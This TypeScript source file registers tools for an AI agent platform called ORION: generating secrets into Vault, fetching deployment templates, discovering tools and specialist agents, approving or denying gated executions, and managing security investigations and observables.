  description: 'Generate cryptographically secure random values server-side for a draft secret and write them directly to Vault. Use this for secrets whose values should be auto-generated (encryption keys, passwords, tokens) — the values are never returned and never appear in this conversation. Only works on secrets in draft status. Refuses to overwrite already-applied secrets.',
  inputSchema: {
    type: 'object',
    properties: {
      secretId: { type: 'string', description: 'The ORION secret id (from orion_list_secrets). Must be in draft status.' },
      keyNames: { type: 'array', items: { type: 'string' }, description: 'Specific key names to generate values for. If omitted, generates values for all keys in the secret.' },
    },
    required: ['secretId'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'secrets',
  handler: async (args, ctx) => {
    const { secretId, keyNames } = args as { secretId: string; keyNames?: string[] }
    if (!secretId) return 'Error: secretId is required'

    const secret = await ctx.prisma.managedSecret.findUnique({ where: { id: secretId } })
    if (!secret) return `Error: secret "${secretId}" not found. Use orion_list_secrets to find the correct id.`
    if (secret.status === 'applied') {
      return [
        `Error: secret "${secret.name}" (${secretId}) is already applied — refusing to overwrite live credentials.`,
        `If you need to rotate this secret, ask the user to confirm first.`,
      ].join('\n')
    }

    const allKeys = (secret.dataKeys as Array<{ remoteKey: string; secretKey: string }>).map(k => k.remoteKey)
    const keysToGenerate = keyNames && keyNames.length > 0 ? keyNames : allKeys

    const unknown = keysToGenerate.filter(k => !allKeys.includes(k))
    if (unknown.length > 0) {
      return `Error: key(s) not found in this secret: ${unknown.join(', ')}. Valid keys: ${allKeys.join(', ')}`
    }

    const generated: Record<string, string> = {}
    for (const key of keysToGenerate) generated[key] = randomBytes(32).toString('hex')

    try {
      await writeVaultSecret(secret.remoteRef, generated)
    } catch (e) {
      return `Error: failed to write generated values to Vault: ${e instanceof Error ? e.message : String(e)}`
    }

    await ctx.prisma.managedSecret.update({
      where: { id: secretId },
      data: { status: 'applied', appliedAt: new Date() },
    })

    return [
      `Generated and stored values for secret "${secret.name}" (${secretId}):`,
      `  Keys generated: ${keysToGenerate.join(', ')}`,
      `  Vault path:     secret/data/${secret.remoteRef}`,
      `  Status:         applied`,
      ``,
      `Values were written directly to Vault — they were not returned here and are not in this conversation.`,
    ].join('\n')
  },
})

// ── Deployment templates ───────────────────────────────────────────────────────

registerTool({
  name: 'list_deployment_templates',
  description: 'List all available deployment templates (Kubernetes and Docker Compose). Each template is a generic YAML starting point with {{ PLACEHOLDER }} fields the agent fills in before proposing to Gitea via gitops_propose.',
  inputSchema: {
    type: 'object',
    properties: {
      category: {
        type: 'string',
        enum: ['core', 'workload', 'networking', 'storage', 'secrets', 'gitops', 'docker'],
        description: 'Filter by category (optional). Omit to list all templates. Use "docker" for Docker Compose templates.',
      },
    },
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'gitops',
  handler: async (args) => {
    const a        = args as { category?: string }
    const filtered = a.category
      ? DEPLOYMENT_TEMPLATES.filter(t => t.category === a.category)
      : DEPLOYMENT_TEMPLATES

    if (filtered.length === 0) return `No templates found${a.category ? ` for category "${a.category}"` : ''}.`

    const grouped: Record<string, typeof filtered> = {}
    for (const t of filtered) {
      ;(grouped[t.category] ??= []).push(t)
    }

    return Object.entries(grouped)
      .map(([cat, templates]) =>
        `**${cat}**\n` +
        templates.map(t => `  • ${t.name} — ${t.description}`).join('\n')
      )
      .join('\n\n')
  },
})

registerTool({
  name: 'get_deployment_template',
  description: 'Get the full YAML content of a deployment template by name. Fill in all {{ PLACEHOLDER }} fields, remove commented-out sections you do not need, then use gitops_propose to open a PR.',
  inputSchema: {
    type: 'object',
    properties: {
      name: {
        type: 'string',
        description: 'Template name (from list_deployment_templates). e.g. "deployment", "ingress-public", "externalsecret".',
      },
    },
    required: ['name'],
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'gitops',
  handler: async (args) => {
    const { name } = args as { name: string }
    const tmpl = getTemplate(name)
    if (!tmpl) {
      const names = DEPLOYMENT_TEMPLATES.map(t => t.name).join(', ')
      return `Template "${name}" not found. Available templates: ${names}`
    }
    return [
      `# Template: ${tmpl.name} [${tmpl.category}]`,
      `# ${tmpl.description}`,
      `#`,
      `# Fill in every {{ PLACEHOLDER }} field before applying.`,
      `# Remove or uncomment optional sections as needed.`,
      `# Use gitops_propose to open a Gitea PR when ready.`,
      ``,
      tmpl.yaml,
    ].join('\n')
  },
})

// ── Ring Leader: findSpecialist ──────────────────────────────────────────────

registerTool({
  name: 'find_specialist',
  description: 'Discover which specialist agent should handle a given task. ' +
    'Searches AgentProfile records by domain, tags, and confidence scoring. ' +
    'Returns ranked results with agentId, domain, description, and confidence. ' +
    'Use this before delegate() when you are unsure which agent should handle a task.',
  inputSchema: {
    type: 'object',
    properties: {
      query: {
        type: 'string',
        description: 'Description of the task or problem to find a specialist for.',
      },
      environment: {
        type: 'string',
        description: 'Optional environment name to filter by.',
      },
      limit: {
        type: 'number',
        description: 'Maximum number of results (1-5, default 3).',
        default: 3,
      },
      minConfidence: {
        type: 'number',
        description: 'Minimum confidence threshold (0.0-1.0, default 0.3).',
        default: 0.3,
      },
    },
    required: ['query'],
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'task',
  category: 'agents',
  handler: async (args) => {
    const { query, environment, limit, minConfidence } = args as {
      query?: string; environment?: string; limit?: number; minConfidence?: number
    }

    if (!query) return 'Error: query is required'

    const q = query.toLowerCase()
    const results = await prisma.agentProfile.findMany({
      where: {
        confidence: { gte: minConfidence ?? 0.3 },
        ...(environment ? { activeEnvironments: { has: environment } } : {}),
      },
      include: { agent: { select: { name: true, status: true } } },
      take: Math.min(Math.max(parseInt(String(limit ?? 3), 10), 1), 5),
    })

    // Score each profile
    const scored = results.map((p: any) => {
      const domainLower = p.domain.toLowerCase()
      let score = 0

      // Domain match
      if (q.includes(domainLower)) score += 0.8
      else if (domainLower.includes(q)) score += 0.5
      else {
        const qWords = q.split(/\s+/).filter((w: string) => w.length > 2)
        const dWords = domainLower.split(/[-_\s]+/).filter((w: string) => w.length > 2)
        const matching = qWords.filter((w: string) => dWords.some((dw: string) => dw.includes(w) || w.includes(dw))).length
        if (qWords.length > 0) score += (matching / qWords.length) * 0.5
      }

      // Tag overlap
      const tags = Array.isArray(p.tags) ? (p.tags as string[]).map((t: string) => t.toLowerCase()) : []
      const qWords2 = q.split(/\s+/).filter((w: string) => w.length > 2)
      if (qWords2.length > 0 && tags.length > 0) {
        const matching = qWords2.filter((w: string) => tags.some((t: string) => t.includes(w) || w.includes(t))).length
        score += (matching / qWords2.length) * 0.3
      }

      // Confidence weight
      score += (p.confidence ?? 0.5) * 0.2

      return { profile: p, score: Math.min(score, 1.0) }
    })

    // Sort by score descending
    scored.sort((a, b) => b.score - a.score)

    if (scored.length === 0) {
      return `No specialist agents matched the query "${query}" (minConfidence: ${minConfidence ?? 0.3}).`
    }

    const lines: string[] = [`Found ${scored.length} specialist agent(s) for: "${query}"`]
    lines.push('')

    for (let i = 0; i < scored.length; i++) {
      const { profile: p, score } = scored[i]
      lines.push(`--- #${i + 1} [${p.domain}] ${p.agent.name} ---`)
      lines.push(`  agentId:      ${p.agentId}`)
      lines.push(`  confidence:   ${(p.confidence * 100).toFixed(0)}%`)
      lines.push(`  score:        ${(score * 100).toFixed(1)}%`)
      lines.push(`  status:       ${p.agent.status}`)
      lines.push(`  description:  ${p.description.slice(0, 200)}`)
      if (Array.isArray(p.tags) && p.tags.length > 0) {
        lines.push(`  tags:         ${(p.tags as string[]).join(', ')}`)
      }
      lines.push('')
    }

    return lines.join('\n')
  },
})

// ── Tool discovery meta-tools ────────────────────────────────────────────────

registerTool({
  name: 'list_tools',
  description: 'List available tools by category. Call this to discover what you can actually do before attempting an operation. Pass a category to narrow the results. ORION categories: tasks, agents, rooms, features, gitops, knowledge, environment, secrets, tools. Gateway categories (when linked): cluster-ops, docker, talos, localhost, security, discovery. Omit category to list everything.',
  inputSchema: {
    type: 'object',
    properties: {
      category: {
        type: 'string',
        description: 'Optional category filter. ORION: tasks, agents, rooms, features, gitops, knowledge, environment, secrets, tools. Gateway: cluster-ops, docker, talos, localhost, security, discovery. Omit to list all.',
      },
    },
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'tools',
  handler: async (args, ctx) => {
    const { category } = (args as Record<string, unknown>) ?? {}

    // Fetch gateway tools if available
    const gatewayTools = ctx.gateway?.listTools ? await ctx.gateway.listTools().catch(() => []) : []
    const gatewayByCategory = new Map<string, string[]>()
    for (const t of gatewayTools) {
      const cat = t.category ?? 'general'
      if (!gatewayByCategory.has(cat)) gatewayByCategory.set(cat, [])
      gatewayByCategory.get(cat)!.push(t.name)
    }

    if (category && typeof category === 'string') {
      // Check ORION registry first
      const orionTools = getToolsByCategory(category as ToolCategory)
      // Then gateway
      const gwTools = gatewayByCategory.get(category) ?? []

      if (orionTools.length === 0 && gwTools.length === 0) {
        const allOrion = getAllCategories()
        const allGw = [...gatewayByCategory.keys()]
        return `No tools found for category "${category}". ORION categories: ${allOrion.join(', ')}${allGw.length ? `. Gateway categories: ${allGw.join(', ')}` : ''}`
      }

      const lines: string[] = [`Tools in category "${category}":`]
      if (orionTools.length > 0) lines.push(...orionTools.map(t => `  - ${t.name}`))
      if (gwTools.length > 0) lines.push(...gwTools.map(n => `  - ${n}`))
      lines.push('\nCall describe_tool(name) to get full details on any tool.')
      return lines.join('\n')
    }

    // No category — list all
    const lines: string[] = ['Available tool categories:\n', '## ORION tools']
    for (const cat of getAllCategories()) {
      const tools = getToolsByCategory(cat)
      lines.push(`${cat} (${tools.length}): ${tools.map(t => t.name).join(', ')}`)
    }
    if (gatewayByCategory.size > 0) {
      lines.push('\n## Gateway tools')
      for (const [cat, names] of gatewayByCategory) {
        lines.push(`${cat} (${names.length}): ${names.join(', ')}`)
      }
    }
    lines.push('\nCall list_tools(category) to filter, or describe_tool(name) for full details.')
    return lines.join('\n')
  },
})

registerTool({
  name: 'describe_tool',
  description: 'Get the full description and input schema for a specific tool. Use this when list_tools gives you a tool name but you need to understand its parameters before calling it. If the tool is not found, this will also check registered Novas (custom tool bundles) and suggest next steps.',
  inputSchema: {
    type: 'object',
    properties: {
      name: { type: 'string', description: 'Exact tool name to describe, e.g. "orion_close_task"' },
    },
    required: ['name'],
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'tools',
  handler: async (args, ctx) => {
    const { name } = (args as Record<string, unknown>) ?? {}
    if (!name || typeof name !== 'string') return 'Error: name is required'

    // 1. Check registered tools
    const tool = getToolDefinition(name)
    if (tool) {
      return JSON.stringify({
        name: tool.name,
        category: tool.category,
        tier: tool.tier,
        description: tool.description,
        inputSchema: tool.inputSchema,
      }, null, 2)
    }

    // 2. Not found in registry — search Novas
    const novas = await ctx.prisma.nova.findMany({
      select: { id: true, name: true },
    })

    const novaMatch = novas.find(n =>
      n.name.toLowerCase().includes(name.toLowerCase()) ||
      name.toLowerCase().includes(n.name.toLowerCase())
    )

    if (novaMatch) {
      return [
        `Tool "${name}" is not a built-in tool, but the Nova "${novaMatch.name}" (id: ${novaMatch.id}) may provide this capability.`,
        `Novas are custom tool bundles installed per-environment.`,
        `Check if this Nova is installed in your target environment, or ask a human to install it.`,
      ].join('\n')
    }

    // 3. Nothing found — suggest options
    const categories = getAllCategories()
    return [
      `Tool "${name}" does not exist in the registry and no matching Nova was found.`,
      ``,
      `Options:`,
      `  1. You may have the wrong name — call list_tools(category) to see actual tool names.`,
      `     Available categories: ${categories.join(', ')}`,
      `  2. If a new tool is genuinely needed, call propose_tool with a name, description, and inputSchema.`,
      `  3. If this should be a Nova (a custom reusable tool bundle), inform a human to create one.`,
    ].join('\n')
  },
})

// ── Execution: Tool Execution Approval Gating ─────────────────────────────────

registerTool({
  name: 'approve_execution',
  description: 'Approve a pending tool execution that is waiting for review. Only use this after reviewing the tool, args, and actor. The execution will proceed immediately after approval.',
  inputSchema: {
    type: 'object',
    properties: {
      executionId: {
        type: 'string',
        description: 'The ORION execution id (from the notification in system.room.execution)',
      },
      reason: {
        type: 'string',
        description: 'Why this execution is approved (logged to audit trail)',
      },
    },
    required: ['executionId', 'reason'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'chat',
  category: 'execution',
  handler: async (args, ctx) => {
    try {
      const { executionId, reason } = parseArgs(args) as { executionId?: string; reason?: string }
      if (!executionId) return 'Error: executionId is required'
      if (!reason) return 'Error: reason is required'

      // Call executor service to approve
      const executorUrl = process.env.ORION_EXECUTOR_URL || 'http://orion-executor:3200'
      const executorToken = process.env.ORION_EXECUTOR_TOKEN

      if (!executorToken) {
        return 'Error: executor service token not configured'
      }

      const response = await fetch(`${executorUrl}/executions/${executionId}/review`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-executor-token': executorToken,
        },
        body: JSON.stringify({
          decision: 'approved',
          reason,
        }),
      })

      if (!response.ok) {
        return `Error: executor service returned ${response.status}`
      }

      return `Execution ${executionId} approved. Reason: ${reason}`
    } catch (e) {
      return `Error: ${e instanceof Error ? e.message : String(e)}`
    }
  },
})

registerTool({
  name: 'deny_execution',
  description: 'Deny a pending tool execution. The calling agent will receive an error. Use when the command looks suspicious, out of scope, or unsafe.',
  inputSchema: {
    type: 'object',
    properties: {
      executionId: {
        type: 'string',
        description: 'The ORION execution id',
      },
      reason: {
        type: 'string',
        description: 'Why this execution is denied (sent back to the calling agent)',
      },
    },
    required: ['executionId', 'reason'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'chat',
  category: 'execution',
  handler: async (args, ctx) => {
    try {
      const { executionId, reason } = parseArgs(args) as { executionId?: string; reason?: string }
      if (!executionId) return 'Error: executionId is required'
      if (!reason) return 'Error: reason is required'

      // Call executor service to deny
      const executorUrl = process.env.ORION_EXECUTOR_URL || 'http://orion-executor:3200'
      const executorToken = process.env.ORION_EXECUTOR_TOKEN

      if (!executorToken) {
        return 'Error: executor service token not configured'
      }

      const response = await fetch(`${executorUrl}/executions/${executionId}/review`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-executor-token': executorToken,
        },
        body: JSON.stringify({
          decision: 'denied',
          reason,
        }),
      })

      if (!response.ok) {
        return `Error: executor service returned ${response.status}`
      }

      return `Execution ${executionId} denied. Reason: ${reason}`
    } catch (e) {
      return `Error: ${e instanceof Error ? e.message : String(e)}`
    }
  },
})

// ── Security / SOC Tools — registered so Warden can access them via MCP ────────
// These mirror the investigation/observable handlers from agent-tools.ts and add
// security_propose_action so Warden can act on incidents without calling write
// tools directly.

import { prisma as _socPrisma } from '@/lib/db'

function _soc<T>(args: unknown): T { return args as T }

registerTool({
  name: 'security_propose_action',
  description: 'Propose a security action (ban IP, active response, firewall block). Routes through the policy-gated action-service: auto-tier executes immediately, approve/escalate-tier queues for operator review.',
  inputSchema: {
    type: 'object',
    properties: {
      actionType: { type: 'string', enum: ['crowdsec_decision_create', 'crowdsec_decision_delete', 'wazuh_active_response', 'firewall_block', 'investigate', 'incident_close', 'suppression_add'] },
      target: { type: 'string', description: 'IP address, decision ID, agent name, or CIDR' },
      reason: { type: 'string', description: 'Why this action is proposed' },
      incidentId: { type: 'string', description: 'Incident ID this action is in response to' },
      payload: { type: 'object', description: 'Additional action parameters (duration, command, scope, etc.)' },
    },
    required: ['actionType', 'target', 'reason'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'chat',
  category: 'security' as any,
  handler: async (args) => {
    const a = _soc<{ actionType: string; target: string; reason: string; incidentId?: string; payload?: Record<string, unknown> }>(args)
    const { decide, execute, gatewayExecutor } = await import('@/lib/security/action-service')
    const panicPolicy = await _socPrisma.actionPolicy.findUnique({ where: { actionType: '__panic_mode__' } })
    const decision = await decide({ actionType: a.actionType, target: a.target, reason: a.reason, incidentId: a.incidentId, payload: a.payload ?? null }, panicPolicy?.defaultTier === 'approve')
    const result = await execute({ actionType: a.actionType, target: a.target, reason: a.reason, incidentId: a.incidentId, payload: a.payload ?? null }, decision, gatewayExecutor)
    if (result.status === 'pending') return `Action queued for ${decision.tier}: ${a.actionType} → ${a.target}. Audit ID: ${result.auditId}. Operator approval required.`
    if (result.status === 'succeeded') return `Action executed: ${a.actionType} → ${a.target}. Audit ID: ${result.auditId}.${result.result ? ` Result: ${result.result}` : ''}`
    return `Action failed: ${a.actionType} → ${a.target}. ${result.result ?? ''}`
  },
})

registerTool({
  name: 'investigation_search',
  description: 'Search investigations by status, severity, or name.',
  inputSchema: { type: 'object', properties: { status: { type: 'string', enum: ['open', 'active', 'suspended', 'resolved', 'closed'] }, search: { type: 'string' }, severity: { type: 'number' } } },
  tier: 'read', parallelSafe: true, availableIn: 'chat', category: 'security' as any,
  handler: async (args) => {
    const a = _soc<{ status?: string; search?: string; severity?: number }>(args)
    const where: Record<string, unknown> = {}
    if (a.status) where.status = a.status
    if (a.search) where.OR = [{ name: { contains: a.search, mode: 'insensitive' } }]
    if (a.severity) where.severity = { gte: Number(a.severity) }
    const invs = await _socPrisma.investigation.findMany({ where, orderBy: { createdAt: 'desc' }, take: 25, select: { id: true, name: true, status: true, severity: true, tlp: true, _count: { select: { incidents: true, notes: true, observables: true } } } })
    const total = await _socPrisma.investigation.count({ where })
    return `Found ${total} (showing ${invs.length}):\n` + invs.map(i => `- [${i.status}] ${i.name} (sev:${i.severity} inc:${i._count.incidents} obs:${i._count.observables}) id:${i.id}`).join('\n')
  },
})

registerTool({
  name: 'investigation_create',
  description: 'Create a new investigation case. Optionally link an incident.',
  inputSchema: { type: 'object', properties: { name: { type: 'string' }, severity: { type: 'number' }, tlp: { type: 'string', enum: ['white', 'green', 'amber', 'red'] }, tags: { type: 'array', items: { type: 'string' } }, incidentId: { type: 'string' } }, required: ['name'] },
  tier: 'write', parallelSafe: false, availableIn: 'chat', category: 'security' as any,
  handler: async (args) => {
    const a = _soc<{ name: string; severity?: number; tlp?: string; tags?: string[]; incidentId?: string }>(args)
    const name = String(a.name ?? '').trim()
    if (!name) return 'Error: name required'
    const inv = await _socPrisma.investigation.create({ data: { name, severity: a.severity ?? 50, tlp: (a.tlp as any) ?? 'amber', tags: a.tags ?? [], mitreAttackIds: [], createdBy: 'warden' } })
    if (a.incidentId) { await _socPrisma.incident.updateMany({ where: { id: a.incidentId, investigationId: null }, data: { investigationId: inv.id } }); return `Investigation created: "${inv.name}" (id: ${inv.id}). Incident linked.` }
    return `Investigation created: "${inv.name}" (id: ${inv.id}, severity: ${inv.severity})`
  },
})

registerTool({
  name: 'investigation_read',
  description: 'Read full details of an investigation.',
  inputSchema: { type: 'object', properties: { investigationId: { type: 'string' } }, required: ['investigationId'] },
  tier: 'read', parallelSafe: true, availableIn: 'chat', category: 'security' as any,
  handler: async (args) => {
    const a = _soc<{ investigationId: string }>(args)
    const inv = await _socPrisma.investigation.findUnique({ where: { id: a.investigationId }, include: { incidents: { take: 20 }, notes: { take: 20 }, observables: { take: 50 }, timeline: { orderBy: { eventTime: 'asc' }, take: 50 } } })
    if (!inv) return `Investigation ${a.investigationId} not found`
    return `"${inv.name}" | ${inv.status} | sev:${inv.severity} | ${inv.incidents.length} incidents, ${inv.observables.length} observables\n` +
      (inv.observables.length ? '\nObservables:\n' + inv.observables.map(o => `  [${o.category}] ${o.value} (${o.verdict})`).join('\n') : '') +
      (inv.incidents.length ? '\nIncidents:\n' + inv.incidents.map(i => `  [${i.status}] ${i.attackerKey ?? 'unknown'} sev:${i.severity}`).join('\n') : '')
  },
})

registerTool({
  name: 'investigation_note',
  description: 'Add a note to an investigation.',
  inputSchema: { type: 'object', properties: { investigationId: { type: 'string' }, content: { type: 'string' } }, required: ['investigationId', 'content'] },
  tier: 'write', parallelSafe: false, availableIn: 'chat', category: 'security' as any,
  handler: async (args) => {
    const a = _soc<{ investigationId: string; content: string }>(args)
    if (!a.investigationId || !a.content) return 'Error: investigationId and content required'
    const inv = await _socPrisma.investigation.findUnique({ where: { id: a.investigationId } })
    if (!inv) return `Investigation ${a.investigationId} not found`
    const note = await _socPrisma.investigationNote.create({ data: { investigationId: a.investigationId, content: a.content, author: 'warden', authorType: 'warden' } })
    await _socPrisma.investigationTimeline.create({ data: { investigationId: a.investigationId, eventTime: new Date(), eventType: 'note_added', title: 'Warden note added', source: 'warden' } })
    return `Note added (id: ${note.id})`
  },
})

registerTool({
  name: 'investigation_update',
  description: 'Update investigation status, severity, or TLP. Cannot set resolved/closed.',
  inputSchema: { type: 'object', properties: { investigationId: { type: 'string' }, status: { type: 'string', enum: ['open', 'active', 'suspended'] }, severity: { type: 'number' }, tlp: { type: 'string', enum: ['white', 'green', 'amber', 'red'] } }, required: ['investigationId'] },
  tier: 'write', parallelSafe: false, availableIn: 'chat', category: 'security' as any,
  handler: async (args) => {
    const a = _soc<{ investigationId: string; status?: string; severity?: number; tlp?: string }>(args)
    if (!a.investigationId) return 'Error: investigationId required'
    const data: Record<string, unknown> = {}
    if (a.status) { if (a.status === 'resolved' || a.status === 'closed') return 'Error: Warden cannot set resolved/closed'; data.status = a.status }
    if (a.severity != null) data.severity = Number(a.severity)
    if (a.tlp) data.tlp = a.tlp
    await _socPrisma.investigation.update({ where: { id: a.investigationId }, data })
    return `Investigation updated: ${Object.keys(data).join(', ')}`
  },
})

registerTool({
  name: 'investigation_link_incident',
  description: 'Link an incident to an investigation.',
  inputSchema: { type: 'object', properties: { investigationId: { type: 'string' }, incidentId: { type: 'string' } }, required: ['investigationId', 'incidentId'] },
  tier: 'write', parallelSafe: false, availableIn: 'chat', category: 'security' as any,
  handler: async (args) => {
    const a = _soc<{ investigationId: string; incidentId: string }>(args)
    if (!a.investigationId || !a.incidentId) return 'Error: investigationId and incidentId required'
    const inc = await _socPrisma.incident.findUnique({ where: { id: a.incidentId } })
    if (!inc) return `Incident ${a.incidentId} not found`
    if (inc.investigationId && inc.investigationId !== a.investigationId) return `Incident already linked to ${inc.investigationId}`
    await _socPrisma.incident.update({ where: { id: a.incidentId }, data: { investigationId: a.investigationId } })
    await _socPrisma.investigationTimeline.create({ data: { investigationId: a.investigationId, eventTime: new Date(), eventType: 'link_added', title: `Incident linked: ${inc.attackerKey ?? a.incidentId}`, source: 'warden' } })
    return `Incident ${a.incidentId} linked to investigation ${a.investigationId}`
  },
})

registerTool({
  name: 'observable_add',
  description: 'Add an observable (IP, domain, hash, URL) to an investigation.',
  inputSchema: { type: 'object', properties: { investigationId: { type: 'string' }, value: { type: 'string' }, category: { type: 'string', enum: ['ipv4', 'ipv6', 'domain', 'url', 'file_hash_md5', 'file_hash_sha1', 'file_hash_sha256', 'mac_address', 'email', 'username', 'file_path', 'registry_key', 'mutex', 'asn'] }, role: { type: 'string', enum: ['ioc', 'artifact', 'infrastructure'] }, verdict: { type: 'string', enum: ['malicious', 'suspicious', 'benign', 'unknown'] }, confidence: { type: 'number' }, context: { type: 'string' } }, required: ['investigationId', 'value', 'category'] },
  tier: 'write', parallelSafe: false, availableIn: 'chat', category: 'security' as any,
  handler: async (args) => {
    const a = _soc<{ investigationId: string; value: string; category: string; role?: string; verdict?: string; confidence?: number; context?: string }>(args)
    if (!a.investigationId || !a.value || !a.category) return 'Error: investigationId, value, category required'
    const verdict = a.verdict ?? 'unknown'
    const confidence = a.confidence ?? 0
    if (verdict === 'malicious' && confidence < 80) return 'Error: confidence >= 80 required for malicious verdict'
    const obs = await _socPrisma.investigationObservable.upsert({
      where: { investigationId_value_category: { investigationId: a.investigationId, value: a.value, category: a.category as any } },
      create: { investigationId: a.investigationId, value: a.value, displayValue: a.value, category: a.category as any, role: (a.role as any) ?? 'ioc', verdict: verdict as any, confidence, context: a.context ?? 'Added by Warden', ...(verdict !== 'unknown' ? { verdictBy: 'warden', verdictAt: new Date() } : {}) },
      update: { lastSeen: new Date(), confidence, ...(verdict !== 'unknown' ? { verdict: verdict as any, verdictBy: 'warden', verdictAt: new Date() } : {}), ...(a.context ? { context: a.context } : {}) },
    })
    return `Observable added: [${a.category}] ${a.value} (verdict: ${verdict}, id: ${obs.id})`
  },
})

registerTool({
  name: 'observable_set_verdict',
  description: 'Set verdict on an observable. Requires confidence >= 80 for malicious.',
  inputSchema: { type: 'object', properties: { observableId: { type: 'string' }, verdict: { type: 'string', enum: ['malicious', 'suspicious', 'benign', 'unknown'] }, confidence: { type: 'number' }, context: { type: 'string' } }, required: ['observableId', 'verdict'] },
  tier: 'write', parallelSafe: false, availableIn: 'chat', category: 'security' as any,
  handler: async (args) => {
    const a = _soc<{ observableId: string; verdict: string; confidence?: number; context?: string }>(args)
    if (!a.observableId || !a.verdict) return 'Error: observableId and verdict required'
    const confidence = a.confidence ?? 0
    if (a.verdict === 'malicious' && confidence < 80) return 'Error: confidence >= 80 required for malicious verdict'
    const updated = await _socPrisma.investigationObservable.update({ where: { id: a.observableId }, data: { verdict: a.verdict as any, confidence, ...(a.context ? { context: a.context } : {}), ...(a.verdict !== 'unknown' ? { verdictBy: 'warden', verdictAt: new Date() } : {}) } })
    return `Verdict set: [${updated.category}] ${updated.value} → ${a.verdict} (confidence: ${confidence}%)`
  },
})

registerTool({
  name: 'timeline_add',
  description: 'Add a timeline entry to an investigation.',
  inputSchema: { type: 'object', properties: { investigationId: { type: 'string' }, eventTime: { type: 'string', description: 'ISO 8601' }, eventType: { type: 'string' }, title: { type: 'string' }, description: { type: 'string' } }, required: ['investigationId', 'eventTime', 'eventType', 'title'] },
  tier: 'write', parallelSafe: false, availableIn: 'chat', category: 'security' as any,
  handler: async (args) => {
    const a = _soc<{ investigationId: string; eventTime: string; eventType: string; title: string; description?: string }>(args)
    if (!a.investigationId) return 'Error: investigationId required'
    const entry = await _socPrisma.investigationTimeline.create({ data: { investigationId: a.investigationId, eventTime: new Date(a.eventTime), eventType: a.eventType, title: a.title, description: a.description, source: 'warden' } })
    return `Timeline entry added: "${a.title}" (id: ${entry.id})`
  },
})
